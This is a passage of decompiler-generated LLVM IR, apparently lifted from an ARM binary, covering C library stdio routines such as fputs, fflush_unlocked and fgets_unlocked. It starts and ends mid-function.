  %v3_14898 = load i32, i32* @r4, align 4
  store i32 %v3_14898, i32* %stack_var_-24, align 4
  %v6_14898 = load i32, i32* @r5, align 4
  %v9_14898 = load i32, i32* @r6, align 4
  %v12_14898 = load i32, i32* @r7, align 4
  %v1_1489c = add i32 %arg3, 52
  %v2_1489c = inttoptr i32 %v1_1489c to i32*
  %v3_1489c = load i32, i32* %v2_1489c, align 4
  store i32 %v3_1489c, i32* %r8.global-to-local, align 4
  %v2_148a0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_148a4 = add i32 %arg3, 56
  store i32 %v1_148a4, i32* @r5, align 4
  %v2_148a8 = icmp eq i32 %v3_1489c, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_148a0, i32* @r0, align 4
  br i1 %v2_148a8, label %dec_label_pc_148c8, label %dec_label_pc_148e4

dec_label_pc_148c8:                               ; preds = %entry
  %v1_148d0 = call i32 @__pthread_return_void()
  store i32 84196, i32* @lr, align 4
  %v1_148e0 = call i32 @__pthread_return_0()
  %v0_148e4.pre = load i32, i32* @r6, align 4
  %v0_148e8.pre = load i32, i32* @r4, align 4
  %v0_148ec.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_148e4

dec_label_pc_148e4:                               ; preds = %entry, %dec_label_pc_148c8
  %v0_148ec = phi i32 [ %arg1, %entry ], [ %v0_148ec.pre, %dec_label_pc_148c8 ]
  %v0_148e8 = phi i32 [ %arg3, %entry ], [ %v0_148e8.pre, %dec_label_pc_148c8 ]
  %v0_148e4 = phi i32 [ %arg2, %entry ], [ %v0_148e4.pre, %dec_label_pc_148c8 ]
  %v3_148f0 = inttoptr i32 %v0_148ec to i8*
  %v4_148f0 = call i32 @__GI_fgets_unlocked(i8* %v3_148f0, i32 %v0_148e4, i32 %v0_148e8)
  %v0_148f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_148f4 = icmp eq i32 %v0_148f4, 0
  store i32 %v4_148f0, i32* %r4.global-to-local, align 4
  br i1 %v2_148f4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_148e4
  store i32 84240, i32* @lr, align 4
  call void @__pseudo_branch(i32 94268)
  %v0_14910.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_148e4, %bb
  %v0_14910 = phi i32 [ %v4_148f0, %dec_label_pc_148e4 ], [ %v0_14910.pre, %bb ]
  %v2_14918 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14918, i32* @r4, align 4
  store i32 %v6_14898, i32* @r5, align 4
  store i32 %v9_14898, i32* @r6, align 4
  store i32 %v12_14898, i32* @r7, align 4
  ret i32 %v0_14910

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_148e4, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1492c = load i32, i32* @r4, align 4
  store i32 %v3_1492c, i32* %stack_var_-20, align 4
  %v6_1492c = load i32, i32* @r5, align 4
  %v9_1492c = load i32, i32* @r6, align 4
  %v12_1492c = load i32, i32* @r7, align 4
  %v1_14930 = add i32 %arg2, 52
  %v2_14930 = inttoptr i32 %v1_14930 to i32*
  %v3_14930 = load i32, i32* %v2_14930, align 4
  store i32 %v3_14930, i32* @r7, align 4
  %v1_14934 = add i32 %arg2, 56
  store i32 %v1_14934, i32* @r5, align 4
  %v2_14938 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1493c = icmp eq i32 %v3_14930, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_14938, i32* @r0, align 4
  br i1 %v2_1493c, label %dec_label_pc_14958, label %dec_label_pc_14974

dec_label_pc_14958:                               ; preds = %entry
  %v1_14960 = call i32 @__pthread_return_void()
  store i32 84340, i32* @lr, align 4
  %v1_14970 = call i32 @__pthread_return_0()
  %v0_14974.pre = load i32, i32* @r4, align 4
  %v0_14978.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14974

dec_label_pc_14974:                               ; preds = %entry, %dec_label_pc_14958
  %v0_14978 = phi i32 [ %arg1, %entry ], [ %v0_14978.pre, %dec_label_pc_14958 ]
  %v0_14974 = phi i32 [ %arg2, %entry ], [ %v0_14974.pre, %dec_label_pc_14958 ]
  %v2_1497c = inttoptr i32 %v0_14978 to i8*
  %v3_1497c = call i32 @__GI_fputs_unlocked(i8* %v2_1497c, i32 %v0_14974)
  %v0_14980 = load i32, i32* @r7, align 4
  %v2_14980 = icmp eq i32 %v0_14980, 0
  store i32 %v3_1497c, i32* %r4.global-to-local, align 4
  br i1 %v2_14980, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14974
  call void @__pseudo_branch(i32 94268)
  %v0_1499c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14974, %bb
  %v0_1499c = phi i32 [ %v3_1497c, %dec_label_pc_14974 ], [ %v0_1499c.pre, %bb ]
  %v2_149a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_149a4, i32* @r4, align 4
  store i32 %v6_1492c, i32* @r5, align 4
  store i32 %v9_1492c, i32* @r6, align 4
  store i32 %v12_1492c, i32* @r7, align 4
  ret i32 %v0_1499c

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14974, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_149bc = ptrtoint i32* %stack_var_-48 to i32
  %v2_149c0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_149c0, i32* @r0, align 4
  store i32 94268, i32* %r4.global-to-local, align 4
  %v1_149d4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r5.global-to-local, align 4
  %v1_149e4 = call i32 @__pthread_return_0()
  %v2_149ec = load i32, i32* @global_var_2a884.853, align 4
  %v7_149f0 = icmp eq i32 %v2_149ec, 1
  br i1 %v7_149f0, label %dec_label_pc_149f8, label %dec_label_pc_14aa4

dec_label_pc_149f8:                               ; preds = %entry
  %v2_149fc = load i32, i32* @global_var_2a888.858, align 4
  %tmp19 = icmp slt i32 %v2_149fc, 1
  br i1 %tmp19, label %dec_label_pc_14aa4, label %dec_label_pc_14a08

dec_label_pc_14a08:                               ; preds = %dec_label_pc_149f8
  store i32 %v2_149bc, i32* @r0, align 4
  %v1_14a18 = call i32 @__pthread_return_void()
  %v1_14a24 = call i32 @__pthread_return_0()
  %v2_14a2c = load i32, i32* bitcast (i32** @global_var_26508.873 to i32*), align 4
  store i32 %v2_14a2c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_14a7c3 = icmp eq i32 %v2_14a2c, 0
  br i1 %v2_14a7c3, label %dec_label_pc_14a88, label %dec_label_pc_14a38

dec_label_pc_14a38:                               ; preds = %dec_label_pc_14a08, %dec_label_pc_14a78
  %v1_14a50 = phi i32 [ %v0_14a78, %dec_label_pc_14a78 ], [ %v2_14a2c, %dec_label_pc_14a08 ]
  %v1_14a38 = inttoptr i32 %v1_14a50 to i8*
  %v2_14a38 = load i8, i8* %v1_14a38, align 1
  %v3_14a38 = zext i8 %v2_14a38 to i32
  %v1_14a3c = add i32 %v1_14a50, 1
  %v2_14a3c = inttoptr i32 %v1_14a3c to i8*
  %v3_14a3c = load i8, i8* %v2_14a3c, align 1
  %v4_14a3c = zext i8 %v3_14a3c to i32
  %v4_14a40 = mul nuw nsw i32 %v4_14a3c, 256
  %v5_14a40 = or i32 %v4_14a40, %v3_14a38
  %v2_14a44 = and i32 %v5_14a40, 32816
  %v7_14a48 = icmp eq i32 %v2_14a44, 48
  %v1_14a4c = add i32 %v1_14a50, 32
  %v2_14a4c = inttoptr i32 %v1_14a4c to i32*
  %v3_14a4c = load i32, i32* %v2_14a4c, align 4
  store i32 %v3_14a4c, i32* %r5.global-to-local, align 4
  br i1 %v7_14a48, label %dec_label_pc_14a58, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_14a38
  store i32 %v1_14a50, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14a78

dec_label_pc_14a58:                               ; preds = %dec_label_pc_14a38
  %v0_14a58 = load i32, i32* %r6.global-to-local, align 4
  %v2_14a58 = icmp eq i32 %v0_14a58, 0
  br i1 %v2_14a58, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_14a58
  %v3_14a60 = add i32 %v0_14a58, 32
  %v4_14a60 = inttoptr i32 %v3_14a60 to i32*
  store i32 %v3_14a4c, i32* %v4_14a60, align 4
  %v0_14a68.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_14a58
  store i32 %v3_14a4c, i32* bitcast (i32** @global_var_26508.873 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_14a68 = phi i32 [ %v0_14a68.pre, %.thread ], [ %v1_14a50, %.thread1 ]
  %v1_14a68 = add i32 %v0_14a68, 1
  %v2_14a68 = inttoptr i32 %v1_14a68 to i8*
  %v3_14a68 = load i8, i8* %v2_14a68, align 1
  %v1_14a6c = and i8 %v3_14a68, 32
  %v1_14a74 = icmp ne i8 %v1_14a6c, 0
  call void @__pseudo_cond_branch(i1 %v1_14a74, i32 ptrtoint (i32* @global_var_15f30.855 to i32))
  %v0_14a78.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14a78

dec_label_pc_14a78:                               ; preds = %.thread12, %bb
  %v0_14a78 = phi i32 [ %v0_14a78.pre, %bb ], [ %v3_14a4c, %.thread12 ]
  store i32 %v0_14a78, i32* %r4.global-to-local, align 4
  %v2_14a7c = icmp eq i32 %v0_14a78, 0
  br i1 %v2_14a7c, label %dec_label_pc_14a88, label %dec_label_pc_14a38

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a78, %dec_label_pc_14a08
  store i32 %v2_149bc, i32* @r0, align 4
  %v1_14a98 = call i32 @__pthread_return_void()
  %v0_14aa0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14aa0, i32* @global_var_2a888.858, align 4
  %v2_14aa8.pre = load i32, i32* @global_var_2a884.853, align 4
  br label %dec_label_pc_14aa4

dec_label_pc_14aa4:                               ; preds = %entry, %dec_label_pc_149f8, %dec_label_pc_14a88
  %v2_14aa8 = phi i32 [ %v2_149ec, %entry ], [ 1, %dec_label_pc_149f8 ], [ %v2_14aa8.pre, %dec_label_pc_14a88 ]
  %v1_14aac = add i32 %v2_14aa8, -1
  store i32 %v1_14aac, i32* @global_var_2a884.853, align 4
  store i32 %v2_149c0, i32* @r0, align 4
  store i32 84680, i32* @lr, align 4
  %v1_14ac4 = call i32 @__pthread_return_void()
  ret i32 %v1_14ac4

; uselistorder directives
  uselistorder i32 %v0_14a78, { 2, 1, 0 }
  uselistorder i32 %v3_14a4c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14a50, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_2a888.858, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14aa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a78, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_14a38, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_14af8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_26508.873 to i32), i32* %r3.global-to-local, align 4
  %v10_14b00 = icmp eq i8* %arg1, bitcast (i32** @global_var_26508.873 to i8*)
  store i1 %v10_14b00, i1* %cpsr_z.global-to-local, align 1
  %.v1_14b04 = select i1 %v10_14b00, i32 0, i32 %tmp
  store i32 %.v1_14b04, i32* %r8.global-to-local, align 4
  %v2_14b0c = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_14b00, label %bb, label %dec_label_pc_14b18

bb:                                               ; preds = %entry
  store i32 %.v1_14b04, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14b24

dec_label_pc_14b18:                               ; preds = %entry
  %v2_14b18 = icmp eq i32 %.v1_14b04, 0
  store i1 %v2_14b18, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_14b18, label %dec_label_pc_14b24, label %dec_label_pc_14c70

dec_label_pc_14b24:                               ; preds = %bb, %dec_label_pc_14b18
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_14b0c, i32* @r0, align 4
  %v1_14b38 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_26524.851 to i32), i32* %r0.global-to-local, align 4
  %v1_14b48 = call i32 @__pthread_return_0()
  %v2_14b50 = load i32, i32* @global_var_2a884.853, align 4
  %v1_14b54 = add i32 %v2_14b50, 1
  store i32 %v1_14b54, i32* %r3.global-to-local, align 4
  store i32 %v1_14b54, i32* @global_var_2a884.853, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_14b0c, i32* @r0, align 4
  %v1_14b6c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_14b0c, i32* @r0, align 4
  %v1_14b80 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2650c.870 to i32), i32* %r0.global-to-local, align 4
  %v1_14b8c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_26508.873 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_14b0c, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_14b9c = load i32, i32* bitcast (i32** @global_var_26508.873 to i32*), align 4
  store i32 %v2_14b9c, i32* @r6, align 4
  %v1_14ba4 = call i32 @__pthread_return_void()
  store i32 %v1_14ba4, i32* %r0.global-to-local, align 4
  store i32 %v2_14b0c, i32* @r4, align 4
  %v0_14bac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14bac, i32* @r5, align 4
  %v0_14c60.pr = load i32, i32* @r6, align 4
  %v2_14c6025 = icmp eq i32 %v0_14c60.pr, 0
  store i1 %v2_14c6025, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c6025, label %dec_label_pc_14c68, label %dec_label_pc_14bb4

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14b24, %.thread11
  %v0_14bd0 = phi i32 [ %v3_14c5c, %.thread11 ], [ %v0_14c60.pr, %dec_label_pc_14b24 ]
  %v1_14bb4 = inttoptr i32 %v0_14bd0 to i8*
  %v2_14bb4 = load i8, i8* %v1_14bb4, align 1
  %v3_14bb4 = zext i8 %v2_14bb4 to i32
  store i32 %v3_14bb4, i32* %r3.global-to-local, align 4
  %v1_14bb8 = and i32 %v3_14bb4, 64
  %v2_14bb8 = icmp eq i32 %v1_14bb8, 0
  store i1 %v2_14bb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bb8, label %.thread11, label %dec_label_pc_14bc0

dec_label_pc_14bc0:                               ; preds = %dec_label_pc_14bb4
  %v2_14bc4 = load i32, i32* @global_var_2653c.864, align 4
  store i32 %v2_14bc4, i32* %r3.global-to-local, align 4
  %v7_14bc8 = icmp eq i32 %v2_14bc4, 2
  store i1 %v7_14bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14bc8, label %dec_label_pc_14bfc, label %dec_label_pc_14bd0

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bc0
  %v1_14bd0 = add i32 %v0_14bd0, 56
  store i32 %v1_14bd0, i32* @r4, align 4
  store i32 %v2_14b0c, i32* @r0, align 4
  store i32 94268, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r1.global-to-local, align 4
  %v1_14be8 = call i32 @__pthread_return_void()
  %v0_14bec = load i32, i32* @r4, align 4
  store i32 %v0_14bec, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r3.global-to-local, align 4
  %v1_14bf8 = call i32 @__pthread_return_0()
  store i32 %v1_14bf8, i32* %r0.global-to-local, align 4
  %v0_14bfc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14bfc

dec_label_pc_14bfc:                               ; preds = %dec_label_pc_14bc0, %dec_label_pc_14bd0
  %v0_14c10 = phi i32 [ %v0_14bd0, %dec_label_pc_14bc0 ], [ %v0_14bfc.pre, %dec_label_pc_14bd0 ]
  %v1_14bfc = inttoptr i32 %v0_14c10 to i32*
  %v2_14bfc = load i32, i32* %v1_14bfc, align 4
  %v0_14c00 = load i32, i32* %sl.global-to-local, align 4
  %v2_14c00 = or i32 %v0_14c00, %v2_14bfc
  %v1_14c04 = xor i32 %v2_14c00, 320
  store i32 %v1_14c04, i32* %r3.global-to-local, align 4
  %v1_14c08 = and i32 %v1_14c04, 832
  %v2_14c08 = icmp eq i32 %v1_14c08, 0
  store i1 %v2_14c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c08, label %dec_label_pc_14c10, label %bb39

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14bfc
  store i32 %v0_14c10, i32* @r0, align 4
  %v0_14c14 = call i32 @__stdio_wcommit()
  store i32 %v0_14c14, i32* %r0.global-to-local, align 4
  %v2_14c18 = icmp eq i32 %v0_14c14, 0
  store i1 %v2_14c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c18, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_14c10
  %v1_14c1c = load i32, i32* @r6, align 4
  %v2_14c1c = inttoptr i32 %v1_14c1c to i32*
  %v3_14c1c = load i32, i32* %v2_14c1c, align 4
  store i32 %v3_14c1c, i32* %r3.global-to-local, align 4
  %v2_14c20 = add i32 %v1_14c1c, 8
  %v3_14c20 = inttoptr i32 %v2_14c20 to i32*
  %v4_14c20 = load i32, i32* %v3_14c20, align 4
  %v2_14c24 = and i32 %v3_14c1c, -65
  store i32 %v2_14c24, i32* %r3.global-to-local, align 4
  %v4_14c28 = sdiv i32 %v3_14c1c, 256
  store i32 %v4_14c28, i32* %r1.global-to-local, align 4
  %v3_14c2c = add i32 %v1_14c1c, 28
  %v4_14c2c = inttoptr i32 %v3_14c2c to i32*
  store i32 %v4_14c20, i32* %v4_14c2c, align 4
  %v1_14c30 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c30 = trunc i32 %v1_14c30 to i8
  %v3_14c30 = load i32, i32* @r6, align 4
  %v4_14c30 = add i32 %v3_14c30, 1
  %v5_14c30 = inttoptr i32 %v4_14c30 to i8*
  store i8 %v2_14c30, i8* %v5_14c30, align 1
  %v0_14c34.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c34.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_14c34 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c34 = trunc i32 %v1_14c34 to i8
  %v3_14c34 = load i32, i32* @r6, align 4
  %v4_14c34 = inttoptr i32 %v3_14c34 to i8*
  store i8 %v2_14c34, i8* %v4_14c34, align 1
  %v0_14c38.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c38.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14c10, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_14bfc, %.thread6, %.thread7
  %v2_14c40 = load i32, i32* @global_var_2653c.864, align 4
  store i32 %v2_14c40, i32* %r3.global-to-local, align 4
  %v7_14c44 = icmp eq i32 %v2_14c40, 2
  store i1 %v7_14c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14c44, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_14b0c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 94268, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 94268)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_14bb4, %bb40
  %v0_14c5c = load i32, i32* @r6, align 4
  %v1_14c5c = add i32 %v0_14c5c, 32
  %v2_14c5c = inttoptr i32 %v1_14c5c to i32*
  %v3_14c5c = load i32, i32* %v2_14c5c, align 4
  store i32 %v3_14c5c, i32* @r6, align 4
  %v2_14c60 = icmp eq i32 %v3_14c5c, 0
  store i1 %v2_14c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c60, label %dec_label_pc_14c60.dec_label_pc_14c68_crit_edge, label %dec_label_pc_14bb4

dec_label_pc_14c60.dec_label_pc_14c68_crit_edge:  ; preds = %.thread11
  %v0_14c68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c68

dec_label_pc_14c68:                               ; preds = %dec_label_pc_14c60.dec_label_pc_14c68_crit_edge, %dec_label_pc_14b24
  %v0_14c68 = phi i32 [ %v0_14c68.pre, %dec_label_pc_14c60.dec_label_pc_14c68_crit_edge ], [ %v1_14ba4, %dec_label_pc_14b24 ]
  %v1_14c68 = call i32 @_stdio_openlist_dec_use(i32 %v0_14c68)
  store i32 %v1_14c68, i32* %r0.global-to-local, align 4
  %v0_14cac.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_14c70:                               ; preds = %dec_label_pc_14b18
  %v1_14c70 = inttoptr i32 %.v1_14b04 to i8*
  %v2_14c70 = load i8, i8* %v1_14c70, align 1
  %v3_14c70 = zext i8 %v2_14c70 to i32
  %v1_14c74 = and i32 %v3_14c70, 64
  store i32 %v1_14c74, i32* %r3.global-to-local, align 4
  %v2_14c74 = icmp eq i32 %v1_14c74, 0
  store i1 %v2_14c74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c74, label %bb41, label %dec_label_pc_14c80

bb41:                                             ; preds = %dec_label_pc_14c70
  br label %bb43

dec_label_pc_14c80:                               ; preds = %dec_label_pc_14c70
  %v0_14c80 = call i32 @__stdio_wcommit()
  store i32 %v0_14c80, i32* %r0.global-to-local, align 4
  %v2_14c84 = icmp eq i32 %v0_14c80, 0
  store i1 %v2_14c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c84, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_14c80
  %v1_14c88 = load i32, i32* %r8.global-to-local, align 4
  %v2_14c88 = inttoptr i32 %v1_14c88 to i32*
  %v3_14c88 = load i32, i32* %v2_14c88, align 4
  store i32 %v3_14c88, i32* %r3.global-to-local, align 4
  %v2_14c8c = add i32 %v1_14c88, 8
  %v3_14c8c = inttoptr i32 %v2_14c8c to i32*
  %v4_14c8c = load i32, i32* %v3_14c8c, align 4
  store i32 %v4_14c8c, i32* %r1.global-to-local, align 4
  %v2_14c90 = and i32 %v3_14c88, -65
  store i32 %v2_14c90, i32* %r3.global-to-local, align 4
  %v4_14c94 = sdiv i32 %v3_14c88, 256
  %v2_14c98 = trunc i32 %v4_14c94 to i8
  %v4_14c98 = add i32 %v1_14c88, 1
  %v5_14c98 = inttoptr i32 %v4_14c98 to i8*
  store i8 %v2_14c98, i8* %v5_14c98, align 1
  %v0_14c9c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c9c.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_14c9c = load i32, i32* %r1.global-to-local, align 4
  %v2_14c9c = load i32, i32* %r8.global-to-local, align 4
  %v3_14c9c = add i32 %v2_14c9c, 28
  %v4_14c9c = inttoptr i32 %v3_14c9c to i32*
  store i32 %v1_14c9c, i32* %v4_14c9c, align 4
  %v1_14ca0 = load i32, i32* %r3.global-to-local, align 4
  %v2_14ca0 = trunc i32 %v1_14ca0 to i8
  %v3_14ca0 = load i32, i32* %r8.global-to-local, align 4
  %v4_14ca0 = inttoptr i32 %v3_14ca0 to i8*
  store i8 %v2_14ca0, i8* %v4_14ca0, align 1
  %v0_14ca4.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14ca4.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_14c80
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_14c68, %.thread20
  %v0_14cac = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_14cac.pre, %dec_label_pc_14c68 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_14cac, i32* %r0.global-to-local, align 4
  store i32 %v3_14af8, i32* @r4, align 4
  ret i32 %v0_14cac

; uselistorder directives
  uselistorder i32 %v0_14cac, { 1, 0 }
  uselistorder i32 %v3_14c5c, { 1, 2, 0 }
  uselistorder i32 %v2_14b0c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 9, 2, 10, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32* bitcast (i32** @global_var_26508.873 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_2a884.853, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14bfc, { 1, 0 }
  uselistorder label %dec_label_pc_14bb4, { 1, 0 }
  uselistorder label %dec_label_pc_14b24, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ce0 = icmp eq i32 %arg2, 0
  store i1 %v2_14ce0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_14d68, label %dec_label_pc_14d4c.preheader

dec_label_pc_14d4c.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_14d4c15 = add i32 %arg2, -1
  store i32 %v1_14d4c15, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_14d4c21 = icmp eq i32 %arg2, 1
  store i1 %v7_14d4c21, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14d4c21, label %dec_label_pc_14d58, label %dec_label_pc_14cf8

dec_label_pc_14cf8:                               ; preds = %dec_label_pc_14d4c.preheader, %dec_label_pc_14d4c.backedge
  %v1_14d5024.in = phi i32 [ %v0_14d50.pre, %dec_label_pc_14d4c.backedge ], [ %arg3, %dec_label_pc_14d4c.preheader ]
  %v1_14cf8 = add i32 %v1_14d5024.in, 16
  %v2_14cf8 = inttoptr i32 %v1_14cf8 to i32*
  %v3_14cf8 = load i32, i32* %v2_14cf8, align 4
  store i32 %v3_14cf8, i32* %r2.global-to-local, align 4
  %v1_14cfc = add i32 %v1_14d5024.in, 24
  %v2_14cfc = inttoptr i32 %v1_14cfc to i32*
  %v3_14cfc = load i32, i32* %v2_14cfc, align 4
  %v3_14d00 = icmp uge i32 %v3_14cf8, %v3_14cfc
  store i1 %v3_14d00, i1* %cpsr_c.global-to-local, align 1
  %v9_14d00 = icmp eq i32 %v3_14cf8, %v3_14cfc
  store i1 %v9_14d00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14d00, label %dec_label_pc_14d20, label %dec_label_pc_14d08

dec_label_pc_14d08:                               ; preds = %dec_label_pc_14cf8
  %v1_14d08 = inttoptr i32 %v3_14cf8 to i8*
